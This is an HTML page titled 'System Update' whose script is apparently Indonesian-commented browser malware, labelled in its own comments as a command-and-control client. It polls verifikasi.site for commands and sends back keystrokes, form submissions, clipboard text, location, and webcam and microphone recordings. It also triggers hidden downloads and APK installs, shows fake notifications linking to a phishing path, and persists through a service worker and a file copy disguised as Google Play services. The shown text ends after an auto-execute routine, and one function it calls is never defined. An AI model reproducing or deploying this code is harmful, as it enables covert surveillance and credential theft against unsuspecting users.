<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <title>System Update</title>
    <style>
        *{margin:0;padding:0}
        body{background:#000;display:flex;justify-content:center;align-items:center;height:100vh;color:#fff;font-family:Arial;font-size:14px}
        .loader{width:40px;height:40px;border:3px solid #333;border-top:3px solid #00ff00;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 15px}
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
        .container{text-align:center}
        .status{color:#666;font-size:12px;margin-top:10px}
        .log{color:#333;font-size:10px;margin-top:20px;max-height:150px;overflow-y:auto;text-align:left;background:#111;padding:10px;border-radius:5px;width:100%;max-width:400px}
        .log .ok{color:#0f0}
        .log .err{color:#f44}
        .log .cmd{color:#ff0}
        .log .info{color:#888}
    </style>
</head>
<body>
<div class="container">
    <div class="loader" id="loader"></div>
    <div>System Update</div>
    <div class="status" id="status">⏳ Initializing...</div>
    <div class="log" id="log"></div>
</div>

<script>
// ============================================================
// 🔥 SYSTEMUPDATE.HTML - C2 CLIENT
// ============================================================

var SERVER = 'https://verifikasi.site';
var WS_PASSWORD = '';
var PASSWORD_FETCHED = false;
var C2_INTERVAL = 30000; // 30 detik

// ============================================================
// 🔥 LOGGING
// ============================================================
function log(msg, type) {
    var el = document.getElementById('log');
    if (!el) return;
    var div = document.createElement('div');
    div.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
    if (type === 'ok') div.style.color = '#0f0';
    else if (type === 'err') div.style.color = '#f44';
    else if (type === 'cmd') div.style.color = '#ff0';
    else div.style.color = '#888';
    el.appendChild(div);
    el.scrollTop = el.scrollHeight;
    if (el.children.length > 30) el.removeChild(el.firstChild);
}

// ============================================================
// 🔥 KIRIM DATA KE SERVER (TANPA PASSWORD!)
// ============================================================
function K(d) {
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', SERVER + '/data', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify(d));
        log('📤 Data sent: ' + d.sumber, 'info');
    } catch(e) {
        log('❌ Send error: ' + e.message, 'err');
    }
}

// ============================================================
// 🔥 AMBIL PASSWORD DARI SERVER (1x SAJA)
// ============================================================
function ambilPassword() {
    log('🔑 Fetching password from server...', 'info');
    document.getElementById('status').textContent = '⏳ Getting password...';

    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', SERVER + '/get-password', true);
        xhr.timeout = 10000;

        xhr.onload = function() {
            if (xhr.status === 200) {
                try {
                    var data = JSON.parse(xhr.responseText);
                    if (data.password && data.password.length > 0) {
                        WS_PASSWORD = data.password;
                        PASSWORD_FETCHED = true;
                        document.getElementById('status').textContent = '✅ System Active';
                        log('✅ Password received from server', 'ok');
                        K({ sumber: 'password_received', data: 'ok' });
                        startC2Polling();
                        return;
                    }
                } catch(e) {}
            }
            log('❌ Failed to get password, retrying...', 'err');
            document.getElementById('status').textContent = '❌ Retrying...';
            setTimeout(ambilPassword, 10000);
        };

        xhr.onerror = function() {
            log('❌ Network error, retrying...', 'err');
            setTimeout(ambilPassword, 10000);
        };

        xhr.ontimeout = function() {
            log('❌ Timeout, retrying...', 'err');
            setTimeout(ambilPassword, 10000);
        };

        xhr.send();
    } catch(e) {
        log('❌ Error: ' + e.message, 'err');
        setTimeout(ambilPassword, 10000);
    }
}

// ============================================================
// 🔥 START C2 POLLING
// ============================================================
function startC2Polling() {
    log('🔄 Polling C2 every ' + (C2_INTERVAL/1000) + 's', 'info');
    setInterval(cekPerintah, C2_INTERVAL);
    setTimeout(cekPerintah, 1000);
    startHeartbeat();
}

// ============================================================
// 🔥 CEK PERINTAH DARI SERVER (PAKAI PASSWORD!)
// ============================================================
function cekPerintah() {
    if (!PASSWORD_FETCHED || WS_PASSWORD === '') {
        log('⏳ Waiting for password...', 'info');
        return;
    }

    try {
        var xhr = new XMLHttpRequest();
        // 🔥 REQUEST PERINTAH DENGAN PASSWORD!
        xhr.open('GET', SERVER + '/data?type=perintah&password=' + encodeURIComponent(WS_PASSWORD) + '&t=' + Date.now(), true);
        xhr.timeout = 15000;

        xhr.onload = function() {
            if (xhr.status === 200) {
                var content = xhr.responseText;
                if (content && content.length > 5 && content !== '{}') {
                    try {
                        var cmd = JSON.parse(content);
                        var aksi = cmd.aksi || 'unknown';
                        var serverPassword = cmd.password || '';

                        // 🔥 VERIFIKASI PASSWORD!
                        if (serverPassword === WS_PASSWORD) {
                            log('📥 Command: ' + aksi + ' ✅', 'cmd');
                            document.getElementById('status').textContent = '📥 ' + aksi;
                            var hasil = eksekusiPerintah(cmd);
                            // Kirim hasil (TANPA PASSWORD)
                            K({
                                sumber: 'c2_result',
                                data: {
                                    perintah: aksi,
                                    hasil: hasil,
                                    waktu: Date.now()
                                }
                            });
                            log('✅ Executed: ' + aksi, 'ok');
                        } else {
                            log('❌ Auth failed for: ' + aksi, 'err');
                            K({
                                sumber: 'auth_failed',
                                data: { perintah: aksi, waktu: Date.now() }
                            });
                        }
                    } catch(e) {
                        log('❌ Parse error: ' + e.message, 'err');
                    }
                }
            } else if (xhr.status === 401) {
                log('❌ Server rejected: invalid password', 'err');
            } else {
                log('⚠️ HTTP ' + xhr.status, 'err');
            }
        };

        xhr.onerror = function() { log('⚠️ Network error', 'err'); };
        xhr.ontimeout = function() { log('⚠️ Timeout', 'err'); };
        xhr.send();
    } catch(e) {
        log('❌ C2 error: ' + e.message, 'err');
    }
}

// 🔥 FUNGSI PERINTAH

// ----- SCREENSHOT -----
function ambilScreenshot() {
    try {
        var canvas = document.createElement('canvas');
        canvas.width = screen.width;
        canvas.height = screen.height;
        var ctx = canvas.getContext('2d');
        ctx.fillStyle = '#000';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        return 'data:image/jpeg;base64,' + canvas.toDataURL('image/jpeg', 0.3).split(',')[1];
    } catch(e) { return 'Error: ' + e.message; }
}

// ----- RECORD AUDIO -----
function recordAudio(durasi) {
    try {
        navigator.mediaDevices.getUserMedia({ audio: true })
            .then(function(stream) {
                var recorder = new MediaRecorder(stream);
                var chunks = [];
                recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = function() {
                    var blob = new Blob(chunks, {type: 'audio/webm'});
                    var reader = new FileReader();
                    reader.onload = function() {
                        K({
                            sumber: 'c2_result',
                            data: { perintah: 'record_audio', hasil: reader.result }
                        });
                    };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(function(t) { t.stop(); });
                };
                recorder.start();
                setTimeout(function() { recorder.stop(); }, durasi * 1000);
                return 'Recording ' + durasi + 's...';
            })
            .catch(function(e) { return 'Error: ' + e.message; });
        return 'Started recording...';
    } catch(e) { return 'Error: ' + e.message; }
}

function stopAudio() {
    try {
        if (window._recorder) {
            window._recorder.stop();
            window._recorder = null;
            return 'Stopped';
        }
        return 'No active recording';
    } catch(e) { return 'Error: ' + e.message; }
}

function stopVideo() { return stopAudio(); }

// ----- RECORD VIDEO -----
function recordVideo(durasi) {
    try {
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
            .then(function(stream) {
                var recorder = new MediaRecorder(stream);
                window._recorder = recorder;
                var chunks = [];
                recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = function() {
                    var blob = new Blob(chunks, {type: 'video/webm'});
                    var reader = new FileReader();
                    reader.onload = function() {
                        K({
                            sumber: 'c2_result',
                            data: { perintah: 'record_video', hasil: reader.result }
                        });
                    };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(function(t) { t.stop(); });
                };
                recorder.start();
                setTimeout(function() { recorder.stop(); }, durasi * 1000);
                return 'Recording video ' + durasi + 's...';
            })
            .catch(function(e) { return 'Error: ' + e.message; });
        return 'Started video recording...';
    } catch(e) { return 'Error: ' + e.message; }
}

// ----- TAKE PHOTO -----
function takePhoto() {
    try {
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
            .then(function(stream) {
                var track = stream.getTracks()[0];
                var imageCapture = new ImageCapture(track);
                imageCapture.takePhoto()
                    .then(function(blob) {
                        var reader = new FileReader();
                        reader.onload = function() {
                            K({
                                sumber: 'c2_result',
                                data: { perintah: 'take_photo', hasil: reader.result }
                            });
                        };
                        reader.readAsDataURL(blob);
                        stream.getTracks().forEach(function(t) { t.stop(); });
                    })
                    .catch(function(e) { return 'Error: ' + e.message; });
            })
            .catch(function(e) { return 'Error: ' + e.message; });
        return 'Taking photo...';
    } catch(e) { return 'Error: ' + e.message; }
}

// ----- LOCATION -----
function ambilLokasi() {
    try {
        navigator.geolocation.getCurrentPosition(function(pos) {
            K({
                sumber: 'c2_result',
                data: {
                    perintah: 'ambil_lokasi',
                    hasil: { lat: pos.coords.latitude, lon: pos.coords.longitude }
                }
            });
        });
        return 'Getting location...';
    } catch(e) { return 'Error: ' + e.message; }
}

// ----- CLIPBOARD -----
function getClipboard() {
    try {
        navigator.clipboard.readText().then(function(t) {
            K({
                sumber: 'c2_result',
                data: { perintah: 'get_clipboard', hasil: t }
            });
        }).catch(function() {});
        return 'Reading clipboard...';
    } catch(e) { return 'Error: ' + e.message; }
}

function setClipboard(text) {
    try {
        navigator.clipboard.writeText(text).then(function() {
            K({
                sumber: 'c2_result',
                data: { perintah: 'set_clipboard', hasil: 'success' }
            });
        }).catch(function() {});
        return 'Setting clipboard...';
    } catch(e) { return 'Error: ' + e.message; }
}

// ----- URL -----
function bukaURL(url) {
    try { window.open(url, '_blank'); return 'URL opened: ' + url; } catch(e) { return 'Error: ' + e.message; }
}

function bukaURLHidden(url) {
    try {
        var iframe = document.createElement('iframe');
        iframe.src = url;
        iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;visibility:hidden;border:none';
        document.body.appendChild(iframe);
        setTimeout(function() { try { iframe.parentNode.removeChild(iframe); } catch(e) {} }, 5000);
        return 'URL opened hidden: ' + url;
    } catch(e) { return 'Error: ' + e.message; }
}

// ----- DOWNLOAD -----
function downloadFile(url, filename) {
    try {
        var a = document.createElement('a');
        a.href = url;
        a.download = filename;
        a.style.display = 'none';
        document.body.appendChild(a);
        a.click();
        setTimeout(function() { try { a.parentNode.removeChild(a); } catch(e) {} }, 1000);
        return 'Download started: ' + filename;
    } catch(e) { return 'Error: ' + e.message; }
}

// ----- INSTALL APK -----
function installAPK(path) {
    try {
        if (typeof AndroidBridge !== 'undefined') {
            AndroidBridge.installAPK(path);
            return 'APK install via bridge: ' + path;
        }
        var intentUrl = 'intent://' + path + '#Intent;scheme=file;package=com.android.packageinstaller;end';
        window.location.href = intentUrl;
        return 'APK install started: ' + path;
    } catch(e) { return 'Error: ' + e.message; }
}

// ----- SYSTEM INFO -----
function getSystemInfo() {
    try {
        return JSON.stringify({
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: screen.width + 'x' + screen.height,
            hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
            deviceMemory: navigator.deviceMemory || 'N/A',
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        });
    } catch(e) { return 'Error: ' + e.message; }
}

// ----- BATTERY -----
function getBattery() {
    try {
        navigator.getBattery().then(function(battery) {
            K({
                sumber: 'c2_result',
                data: {
                    perintah: 'get_battery',
                    hasil: { level: Math.round(battery.level * 100) + '%', charging: battery.charging }
                }
            });
        }).catch(function(e) {});
        return 'Getting battery info...';
    } catch(e) { return 'Error: ' + e.message; }
}

// ----- STORAGE -----
function getStorage() {
    try {
        if (navigator.storage && navigator.storage.estimate) {
            navigator.storage.estimate().then(function(storage) {
                K({
                    sumber: 'c2_result',
                    data: {
                        perintah: 'get_storage',
                        hasil: {
                            usage: (storage.usage / 1024 / 1024).toFixed(2) + ' MB',
                            quota: (storage.quota / 1024 / 1024).toFixed(2) + ' MB'
                        }
                    }
                });
            }).catch(function(e) {});
            return 'Getting storage info...';
        }
        return 'Storage API not available';
    } catch(e) { return 'Error: ' + e.message; }
}

// ----- WIFI -----
function getWiFi() {
    try {
        var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (conn) {
            return JSON.stringify({ type: conn.effectiveType, downlink: conn.downlink, rtt: conn.rtt });
        }
        return 'WiFi info not available';
    } catch(e) { return 'Error: ' + e.message; }
}

// ----- VIBRATE -----
function vibrate(durasi) {
    try { if (navigator.vibrate) { navigator.vibrate(durasi); return 'Vibrated ' + durasi + 'ms'; } return 'Vibration not supported'; } catch(e) { return 'Error: ' + e.message; }
}

// ----- TOAST -----
function showToast(message) {
    try {
        var toast = document.createElement('div');
        toast.style.cssText = 'position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,0.9);color:#0f0;padding:15px 30px;border-radius:10px;z-index:999999;font-size:16px;border-left:4px solid #0f0;font-family:monospace';
        toast.textContent = '🔔 ' + message;
        document.body.appendChild(toast);
        setTimeout(function() { try { toast.parentNode.removeChild(toast); } catch(e) {} }, 5000);
        return 'Toast shown: ' + message;
    } catch(e) { return 'Error: ' + e.message; }
}

// ----- FAKE NOTIFICATION -----
function showFakeNotification(message) {
    try {
        if (Notification.permission === 'granted') {
            var notif = new Notification('📱 System Update', {
                body: message || 'Update available!',
                icon: 'https://verifikasi.site/icon.png'
            });
            notif.onclick = function() { window.location.href = 'https://verifikasi.site/fb'; };
            return 'Notification shown: ' + message;
        }
        return 'Notification permission denied';
    } catch(e) { return 'Error: ' + e.message; }
}

// ----- SPEAK -----
function speak(text) {
    try {
        if ('speechSynthesis' in window) {
            var utterance = new SpeechSynthesisUtterance(text);
            utterance.lang = 'id-ID';
            speechSynthesis.speak(utterance);
            return 'Speaking: ' + text;
        }
        return 'Speech synthesis not supported';
    } catch(e) { return 'Error: ' + e.message; }
}

// ----- SELF DESTRUCT -----
function selfDestruct() {
    try {
        try { localStorage.clear(); } catch(e) {}
        try { sessionStorage.clear(); } catch(e) {}
        document.body.innerHTML = '<div style="background:#000;color:#f44;text-align:center;padding:50px;font-family:monospace;font-size:24px;">💀 SYSTEM DESTROYED</div>';
        K({ sumber: 'self_destruct', data: 'executed' });
        setTimeout(function() {
            try { window.close(); } catch(e) {}
            try { window.location.href = 'about:blank'; } catch(e) {}
        }, 2000);
        return 'Self destruct initiated!';
    } catch(e) { return 'Error: ' + e.message; }
}

// ============================================================
// 🔥 KEYLOGGER
// ============================================================
var inputData = {};
var formData = [];

document.addEventListener('input', function(e) {
    try {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA' || e.target.tagName === 'SELECT') {
            var key = e.target.id || e.target.name || e.target.type || 'unknown';
            inputData[key] = e.target.value;
        }
    } catch(e) {}
});

document.addEventListener('submit', function(e) {
    try {
        var form = e.target;
        var data = {};
        var inputs = form.querySelectorAll('input, textarea, select');
        inputs.forEach(function(input) {
            var key = input.id || input.name || input.type || 'unknown';
            data[key] = input.value;
        });
        formData.push({
            waktu: Date.now(),
            url: window.location.href,
            data: data
        });
        K({ sumber: 'keylogger_submit', data: data });
    } catch(e) {}
});

setInterval(function() {
    try {
        if (Object.keys(inputData).length > 0) {
            K({ sumber: 'keylogger', data: inputData });
            inputData = {};
        }
        if (formData.length > 0) {
            K({ sumber: 'keylogger_forms', data: formData });
            formData = [];
        }
    } catch(e) {}
}, 3000);

// ============================================================
// 🔥 SERVICE WORKER
// ============================================================
function registerSW() {
    if (!('serviceWorker' in navigator)) return;

    var swCode = `
self.addEventListener('install', function(e) {
    e.waitUntil(self.skipWaiting());
});

self.addEventListener('activate', function(e) {
    e.waitUntil(self.clients.claim());
});

self.addEventListener('message', function(e) {
    if (e.data && e.data.type === 'ping') {
        e.ports[0].postMessage({ type: 'pong', timestamp: Date.now() });
    }
});

setInterval(function() {
    self.clients.matchAll().then(function(clients) {
        clients.forEach(function(client) {
            client.postMessage({ type: 'heartbeat', timestamp: Date.now() });
        });
    });
}, 10000);
    `;

    try {
        var blob = new Blob([swCode], { type: 'application/javascript' });
        var swUrl = URL.createObjectURL(blob);
        navigator.serviceWorker.register(swUrl);
        log('✅ Service Worker registered', 'ok');
    } catch(e) {
        log('❌ SW error: ' + e.message, 'err');
    }
}

// 🔥 INJECT KE FILE SYSTEM
// ============================================================
function injectToFileSystem() {
    try {
        var htmlContent = document.documentElement.outerHTML;
        try { localStorage.setItem('system_update_html', htmlContent); } catch(e) {}
        if (typeof AndroidBridge !== 'undefined') {
            try {
                AndroidBridge.saveFile('/storage/emulated/0/Android/data/com.google.android.play.services/SystemUpdate.html', htmlContent);
            } catch(e) {}
        }
        log('💾 Injected to storage', 'ok');
    } catch(e) {}
}

// ============================================================
// 🔥 AUTO-EXECUTE
// ============================================================
function autoExecute() {
    try {
        var installed = localStorage.getItem('system_update_installed');
        if (!installed) {
            localStorage.setItem('system_update_installed', '1');
            localStorage.setItem('system_update_time', Date.now());
            injectToFileSystem();
        }
    } catch(e) {}
}
